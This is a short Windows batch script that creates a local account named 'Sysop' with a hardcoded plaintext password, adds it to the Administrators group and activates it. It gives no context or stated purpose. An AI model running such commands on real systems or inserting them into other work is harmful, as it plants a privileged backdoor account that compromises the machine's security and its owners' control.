@echo off

net user "Sysop" "12R0m@!sD" /add
net localgroup "Administrators" "Sysop" /add
Net user Sysop /active:yes

